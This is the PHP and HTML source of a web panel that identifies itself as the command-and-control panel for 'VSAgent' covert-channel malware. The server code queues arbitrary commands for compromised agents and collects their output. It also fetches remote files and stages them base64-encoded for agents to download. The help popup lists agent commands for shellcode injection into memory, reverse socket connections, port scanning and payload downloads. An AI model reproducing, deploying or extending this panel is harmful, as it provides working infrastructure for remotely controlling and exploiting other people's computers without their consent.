<?php require 'common.php'; ?>

<?php

function CURLdownload($url, $file) 
{ 
  $ch = curl_init(); 
  if(!$ch) return false;
  if( !curl_setopt($ch, CURLOPT_URL, $url) ) { 
    fclose($fp);
    curl_close($ch);
    return false;
  }
  if( !curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)) return false;
  if( !curl_setopt($ch, CURLOPT_HEADER, 0)) return false;
  $data = curl_exec($ch);
  if(!$data) return false;
  curl_close($ch); 
  $encoded = base64_encode($data);
  $fp = fopen($file, "w"); 
  if(!$fp) return false;
  if(!fwrite($fp,$encoded)) return false;
  fclose($fp); 
  return true;
} 

if (isset($_REQUEST['method'])) {
    $method = $_REQUEST['method'];
    $res = array();
    switch ($method) {
        case 'put_command':
            $agent = $_REQUEST['agent'];
            $command = $_REQUEST['command'];
            if (preg_match('/^!interval/i', $command)) {
                $pieces = explode(' ', $command);
                $interval = intval(end($pieces));
                $prep = $db->prepare('UPDATE agents SET interval = :interval WHERE id = :agent');
                $prep->execute(array(':interval' => $interval, ':agent' => $agent));
                $prep = $db->prepare('INSERT INTO commands (time_snd, time_rcv, agent_id, command, result) VALUES (datetime(\'now\'), datetime(\'now\'), :agent, :command, \'Interval change committed.\')');
                $prep->execute(array(':agent' => $agent, ':command' => $command));
            }
            elseif (preg_match('/^!b64download/i',$command)) {
              $pieces = explode(' ', $command);
              if (count($pieces) != 3) break;
              $url = $pieces[1];
              $newfilename = $pieces[2];
              $randstr = substr(md5(rand()),0,12);
              if(CURLdownload($url,'dropbox/'.$randstr)) {
                $newurl = 'http://'.$_SERVER['HTTP_HOST'].'/dropbox/'.$randstr;
                $newcommand = '!b64download '.$newurl.' '.$newfilename;
                $prep = $db->prepare('INSERT INTO commands (time_snd, agent_id, command) VALUES (datetime(\'now\'), :agent, :command)');
                $prep->execute(array(':agent' => $agent, ':command' => $newcommand));
              }
              else {
                // this is a hack just to show an error when CURL fails
                $prep = $db->prepare('INSERT INTO commands (time_snd, agent_id, command) VALUES (datetime(\'now\'), :agent, :command)');
                $prep->execute(array(':agent' => $agent, ':command' => $command));
              }
            }
            else {
                $prep = $db->prepare('INSERT INTO commands (time_snd, agent_id, command) VALUES (datetime(\'now\'), :agent, :command)');
                $prep->execute(array(':agent' => $agent, ':command' => $command));
            }
            $res['message'] = 'success';
            break;
        case 'get_results':
            $agent = $_REQUEST['agent'];
            $res['results'] = array();
            $prep = $db->prepare('SELECT command, result FROM commands WHERE agent_id = :agent AND result IS NOT NULL');
            $prep->execute(array(':agent' => $agent));
            while ($row = $prep->fetch(PDO::FETCH_ASSOC)) {
                array_push($res['results'], $row);
            }
            $res['queue'] = array();
            $prep = $db->prepare('SELECT command FROM commands WHERE agent_id = :agent AND result IS NULL');
            $prep->execute(array(':agent' => $agent));
            while ($row = $prep->fetch(PDO::FETCH_ASSOC)) {
                array_push($res['queue'], $row['command']);
            }
            break;
        case 'get_agents':
            $res['agents'] = array();
            $prep = $db->prepare('SELECT (strftime(\'%s\',\'now\') - strftime(\'%s\',last_poll)) as diff, id, interval FROM agents');
            $prep->execute();
            while ($row = $prep->fetch(PDO::FETCH_ASSOC)) {
                array_push($res['agents'], $row);
            }
            break;
        case 'purge_data':
            $prep = $db->prepare('DELETE FROM agents');
            $prep->execute();
            $prep = $db->prepare('DELETE FROM commands');
            $prep->execute();
            $res['message'] = 'success';
            break;
        default:
            $res['message'] = 'invalid method';
    }
    echo json_encode($res);
    exit;
}

?>

<!DOCTYPE HTML>
<html>
<head>
<script type="text/javascript" src="jquery-1.7.1.min.js"></script>
<script>
var lastMarkup = '';
var listSize = 5;
function getResults() {
    var select = document.getElementById('agent');
    if (select.selectedIndex == -1) { return; }
    agent = select.value;
    $.ajax({
        type: 'POST',
        url: location.href,
        data: { method: 'get_results', agent: agent },
        async: false,
        success: function(data) {
            var json = $.parseJSON(data);
            var markup = '';
            for (var i = 0; i < json.results.length; i++) { 
                markup += '> ' + json.results[i].command + '\n\n' + json.results[i].result + '\n\n';
            }
            var textarea = document.getElementById('result')
            if (lastMarkup != markup) {
                textarea.innerHTML = lastMarkup = markup;
                textarea.scrollTop = textarea.scrollHeight;
            }
            document.getElementById('queue').innerHTML = '';
            for (i in json.queue) {
                addToQueue(json.queue[i]);
            }
        }
    });
}
function addToQueue(command) {
    var p = document.createElement("p");
    p.innerHTML = command;
    var queue = document.getElementById('queue');
    queue.appendChild(p)
}
function getAgents() {
    $.ajax({
        type: 'POST',
        url: location.href,
        data: { method: 'get_agents' },
        async: false,
        success: function(data) {
            var json = $.parseJSON(data);
            var select = document.getElementById('agent');
            if (select.selectedIndex > -1) {
                var selected = select.options[select.selectedIndex].value;
            } else {
                var selected = '';
            }
            select.options.length = 0;
            for (var i=0; i<json.agents.length; i++) {
                var option = document.createElement('option');
                var agent = json.agents[i].id;
                var interval = parseInt(json.agents[i].interval);
                option.text = agent;
                if (json.agents[i].diff < (interval + 1)) {
                    option.text += '*';
                }
                option.value = agent;
                if (agent == selected) {
                    option.selected = true;
                }
                select.appendChild(option);
            }
            // resize list box to fit all agents
            if (json.agents.length > listSize) {
                select.setAttribute('size', json.agents.length);
            } else {
                select.setAttribute('size', listSize);
            }
        }
    });
}
function putCommand(command) {
    var select = document.getElementById('agent');
    if (select.selectedIndex == -1) {
        alert('No agent selected.');
        return;
    }
    var agent = select.value;
    var command = document.getElementById('command').value;
    $.ajax({
        type: 'POST',
        url: location.href,
        data: { method: 'put_command', agent: agent, command: command },
        async: true,
        success: function(data) {
            addToQueue(command);
        }
    });
    document.getElementById('command').value = '';
    return false;
}
function onLoad() {
    document.getElementById('command').focus();
    window.onresize = function(event) {
        document.getElementById('result').style.height = (window.innerHeight - 70) + 'px';
    }
    window.onresize();
    poll();
}
function poll() {
    getAgents();
    getResults();
    window.setTimeout(function() { poll(); },3000);
}
function purgeData() {
    if (confirm('Are you sure you want to purge all contents from the database?')) {
        $.ajax({
            type: 'POST',
            url: location.href,
            data: { method: 'purge_data' },
            async: true,
            success: function(data) {
                var json = $.parseJSON(data);
                window.location = window.location.href;
            }
        });
    }
}
</script>
<style>
* {
    padding: 0px;
    margin: 0px;
    box-sizing: border-box; /* css3 rec */
    -moz-box-sizing: border-box; /* ff2 */
    -ms-box-sizing: border-box; /* ie8 */
    -webkit-box-sizing: border-box; /* safari3 */
}
body {
    padding: 8px;
    font-family: monospace;
    font-size: 16px;
    background-color: lightgray;
}
div.main {
    width: 100%;
}
div.nav {
    width: 150px;
    float: left;
}
div.agents {
    border: 1px solid gray;
    display: inline-block;
    overflow: hidden;
    vertical-align: top;
}
select {
    padding:4px;
    margin:-5px -20px -5px -5px;
    width: 250px;
    font-family: monospace;
    font-size: 12px;
}
div.queue {
    margin-top: 10px;
    padding-top: 5px;
    font-size: 12px;
    font-style: italic;
    overflow: hidden;
    white-space: nowrap;
    border-top: 1px solid gray;
    width: 200px;
}
p {
}
div.term {
    margin-left: 250px;
}
div.result {
}
textarea {
    vertical-align: top;
    display: table-cell;
    border: 1px solid gray;
    border-bottom: 0px;
    resize: none;
    outline: none;
    width: 100%;
    font-family: monospace;
    font-size: 16px;
}
div.command {
}
form {
    margin-bottom: 8px;
    padding: 4px 0;
    background-color: white;
    border: 1px solid gray;
}
label {
    display: table-cell;
}
span {
    display: table-cell;
    width: 100%;
}
input[type="text"] {
    width: 100%;
    border: 0px solid gray;
    outline: none;
    font-family: monospace;
    font-size: 16px;
}
div.footer {
    text-align: center;
    font-size: 12px;
}
div.help {
    position: absolute;
    left: 8px;
    bottom: 8px;
}
div.clean {
    position: absolute;
    left: 30px;
    bottom: 8px;
    background-color: white;
    border: 1px solid gray;
    padding: 0 3px;
    font-size: 16px;
    text-align: center;
}
div.trigger{
    position:relative;
    background-color: white;
    border: 1px solid gray;
    padding: 0 3px;
    font-size: 16px;
}
div.popup {
    display: none;
    position: absolute;
    z-index: 100;
    left: 5px;
    bottom: 5px;
    text-align: left;
    background-color: white;
    border: 1px solid gray;
    padding: 5px 5px 5px 0px;
    white-space: nowrap;
    font-size: 14px;
}
div.popup table td {
    padding-left: 5px;
}
div.trigger:hover div.popup {
    display: block;
}
</style>
</head>
<body onload="onLoad();">
    <div class="main">
        <div class="nav">
            <div class="agents">
                <select id="agent" onchange="getResults();"></select>
            </div>
            <div class="queue" id="queue"></div>
        </div>
        <div class="term">
            <div class="result">
                <textarea id="result" wrap="on" readonly></textarea>
            </div>
            <div class="command">
                <form onsubmit="return putCommand();"><label>vsagent>&nbsp;</label><span><input type=text id="command" /></span></form>
            </div>
        </div>
    </div>
    <div class="footer">VSGUI, Covert Channel Malware (VSAgent) C2 Panel</div>
    <div class="help">
        <div class="trigger">?
            <div class="popup">
                <table>
                    <tr><td>!inject &lt;shellcode&gt;</td><td>- Injects shellcode directly into memory. (Windows only)</td></tr>
                    <tr><td>!connect &lt;host&gt; &lt;port&gt;</td><td>- Makes a reverse socket connection from the remote host.</td></tr>
                    <tr><td>!portscan &lt;host&gt;</td><td>- TCP connect portscan of top 20 TCP ports.<br>
                    (21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080)</td></tr>
                    <tr><td>!download &lt;url&gt;</td><td>- Downloads files to the remote host.</td></tr>
                    <tr><td>!b64download &lt;url&gt; &lt;decoded_filename&gt;</td><td>- Downloads files to the control server, base64 encodes and downloads to vsagent, then decodes and saves.</td></tr>
                    <tr><td>!purge</td><td>- Permanently removes the agent from the remote host. (script only)</td></tr>
                    <tr><td>!kill</td><td>- Kills the agent. Does NOT remove the agent from the remote host.</td></tr>
                    <tr><td>!interval</td><td>- Change polling interval</td></tr>
                    <tr><td>!timeout</td><td>- Change command execution output timeout. </td></tr>
                    <tr><td>!status</td><td>- Show vsagent status info.</td></tr>
                </table>
            </div>
        </div>
    </div>
     <div class="clean" onclick="purgeData();">X</div>
</body>
</html>
